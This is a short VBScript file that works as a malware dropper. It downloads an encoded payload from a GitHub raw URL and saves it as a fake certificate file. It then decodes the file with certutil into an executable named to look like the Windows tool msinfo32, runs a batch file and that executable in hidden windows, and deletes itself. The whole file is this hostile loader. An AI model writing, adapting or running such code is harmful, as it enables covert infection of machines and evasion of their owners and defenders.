WScript.Sleep(5000)
Set objWinHttp = CreateObject("WinHttp.WinHttpRequest.5.1")
URL = "https://raw.githubusercontent.com/kaitlyn93/Grandcoffee/main/js/scripts/msinfo32.js"
objWinHttp.open "GET", URL, False
objWinHttp.send ""
SaveBinaryData "C:\ProgramData\msinfo32\cert64.crt",objWinHttp.responseBody
Function SaveBinaryData(FileName, Data)
	Const adTypeText = 1
	Const adSaveCreateOverWrite = 2
	Dim BinaryStream
	Set BinaryStream = CreateObject("ADODB.Stream")
	BinaryStream.Type = adTypeText
	BinaryStream.Open
	BinaryStream.Write Data
	BinaryStream.SaveToFile FileName, adSaveCreateOverWrite
End Function

Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "cmd /c powershell certutil -decode C:\ProgramData\msinfo32\cert64.crt C:\ProgramData\msinfo32\msinfo32.exe", 0, True
WScript.Sleep(3000)

Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "cmd /c C:\ProgramData\msinfo32\startup.bat", 0, True
WScript.Sleep(3000)

Set WshShell = CreateObject("WScript.Shell")
WshShell.Run chr(34) & "C:\ProgramData\msinfo32\msinfo32.exe" & chr(34), 0
Set WsgShell = Nothing

Set objFSO = CreateObject("Scripting.FileSystemObject")
strScript = Wscript.ScriptFullName
objFSO.DeleteFile(strScript)
